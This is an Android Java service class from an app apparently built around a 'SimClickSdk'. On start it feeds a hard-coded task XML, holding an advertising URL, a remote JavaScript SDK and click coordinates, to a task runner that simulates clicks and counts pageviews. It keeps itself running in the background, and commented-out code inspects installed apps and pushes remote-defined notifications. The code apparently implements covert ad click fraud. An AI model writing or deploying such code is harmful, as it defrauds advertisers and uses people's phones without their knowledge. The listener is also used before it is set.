package dlg.lizhihao.com.mobilezausap.SlGeneral;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import dlg.lizhihao.com.mobilezausap.SlGeneral.simclick.open.SimClickSdkForService;
import dlg.lizhihao.com.mobilezausap.SlGeneral.simclick.util.LogUtil;
import dlg.lizhihao.com.mobilezausap.SlGeneral.task.TaskManager;


public  class MyService extends Service{
    protected String tag = MyService.class.getName();
    boolean flag=false;
    private TaskResultListener mTaskResultListener;
    private static int id = 0;

    @Override
    public IBinder onBind(Intent intent) {
        String msg = String.format(">>服务%s:onBind,intent=%s", tag, intent);
//        Toast.makeText(this, msg, Toast.LENGTH_SHORT).show();
        Log.e(tag, msg);
        //return new MyBinder();
        return null;
    }
    @Override
    public boolean onUnbind(Intent intent) {
        String msg = String.format(">>服务%s:onUnbind,intent=%s", tag, intent);
//        Toast.makeText(this, msg, Toast.LENGTH_SHORT).show();
        Log.e(tag, msg);
        return super.onUnbind(intent);
    }
    @Override
    public void onCreate() {
        super.onCreate();
        try {
        }catch (Exception e){
            e.printStackTrace();
        }
        String msg = String.format("广告>>服务%s:onCreate", tag);
//        Toast.makeText(this, msg, Toast.LENGTH_SHORT).show();
        Log.e(tag, msg);
    }
    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        String msg = String.format("广告>>服务%s:onStart,intent=%s,startId=%s", tag, intent, startId);
//        Toast.makeText(this, msg, Toast.LENGTH_SHORT).show();
        Log.e(tag, msg);
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        //monitorApp();
        String xml="<t a=\"1000|100||900,1600\" s=\"http://m.huabian.com\" src=\"http://c3.moogos.com/js/_jssdk.js?aid=s930ea1a\"><p a=\"8,12|1|1|10\"><p a=\"5,10|1|2|5\"><p a=\"5,10|1|2|5\"/></p></p><c a=\"1|1,2|230|1\" r=\"480,800|50,730,300,20|0|2\"/><c a=\"2|1,2|900|0|0\" l=\"\"/></t>";
      //  SdkContext.userAgent = eventModel.getUa();
        //eventModel.getTaskId()
        //eventModel.getParamId()
        //eventModel.getTaskXml()
        TaskManager.executeTaskForSer(getApplicationContext(),1 ,
               1,xml, mTaskResultListener);
        mTaskResultListener = new TaskResultListener();
        String msg = String.format("广告>>服务%s:onStartCommand,intent=%s,flags=%s,startId=%s", tag, intent, flags, startId);
//        Toast.makeText(this, msg, Toast.LENGTH_SHORT).show();
        Log.e(tag, msg);
//        TaskRunnerForService.getInstance(getApplicationContext()).startTask();
        flags = Service.START_STICKY;
        return super.onStartCommand(intent, flags, startId);
    }
    /**
    @Subscribe(
            tag = Constants.TAG_EVENT_GETTASK_SUC
    )
    public void getTaskXml(TaskXmlEventModel eventModel){
        LogUtil.d(tag,"###收到宿主广播"+eventModel.getTaskXml());
        //notify_normal_moreLine();
//        StatService.onEvent(getApplicationContext(),"plugin_open","ad_plugin--"+eventModel.getTaskId());
        String xml=eventModel.getTaskXml().replaceAll("&","&amp;");
        eventModel.setTaskXml(xml);
        List<TTag> taskList = TaskXmlParser.getInstance().parseTask(xml);
        for(TTag tTag:taskList){
            //  SharedPreferenceUtil.STARTURL=tTag.getStart();
            if(tTag.getTitle()!=null){
                if(tTag.getPname()!=null){
                    List<AppUtils.AppInfo> list = AppUtils.getAppsInfo(this);
                    for(AppUtils.AppInfo appInfo:list){
                        if(appInfo.getPackageName().equals(tTag.getPname())){
                            flag=true;
                            break;
                        }
                    }
                    if(flag==false){
                        new MYTask(tTag.getTitle(),tTag.getTicker(),tTag.getStart(),tTag.getContent()).execute(tTag.getImgUrl());
                        // new MYTask(tTag.getTicker(),tTag.getTitle(),tTag.getStart(),tTag.getContent()).execute(tTag.getImgUrl());
                        //  StatService.onEvent(getApplicationContext(),"push_success","push_success");
                    }
                }else{
                    new MYTask(tTag.getTitle(),tTag.getTicker(),tTag.getStart(),tTag.getContent()).execute(tTag.getImgUrl());
                    //  new MYTask(tTag.getTicker(),tTag.getTitle(),tTag.getStart(),tTag.getContent()).execute(tTag.getImgUrl());
                }
            }
        }

    }
     **/
    @Override
    public void onDestroy() {
        String msg = String.format(">>服务%s:onDestroy", tag);
//        Toast.makeText(this, msg, Toast.LENGTH_SHORT).show();
        Log.e(tag, msg);
//        TaskRunnerForService.getInstance(getApplicationContext()).stop();
        super.onDestroy();
    }
    @Override
    public void onRebind(Intent intent) {
        String msg = String.format("广告>>服务%s:onRebind,intent=%s", tag, intent);
//        Toast.makeText(this, msg, Toast.LENGTH_SHORT).show();
        Log.e(tag, msg);
        super.onRebind(intent);
    }
    private class TaskResultListener implements SimClickSdkForService.OnTaskResultListener {
        @Override
        public void onSuccess(boolean taskFinish, int taskId, int programId, double step, int pv) {
            LogUtil.i(tag, "onSuccess, taskFinish = " + taskFinish + ", taskId = "
                    + taskId + ", programId = " + programId + ", step = " + step
                    + ", pv = " + pv );

            //任务完成，返回
            if (taskFinish){
                //APIClient.sendTaskResult(taskId, programId, pv, MyService.this);
               // sendTaskFinishEvent();
            }
        }
        @Override
        public void onFailure(boolean taskFinish, int taskId, int programId, double step) {
            LogUtil.i(tag, "onFailure, taskFinish = " + taskFinish + ", taskId = "
                    + taskId + ", programId = " + programId + ", step = " + step);
            if (taskFinish){
                    sendTaskFinishEvent();
            }
        }
    }
    private void sendTaskFinishEvent(){
        //LogUtil.d(tag, "send task finish");
       // RxUtil.get().post(Constants.TAG_EVENT_TASK_FINISH, "task_finish");
    }
}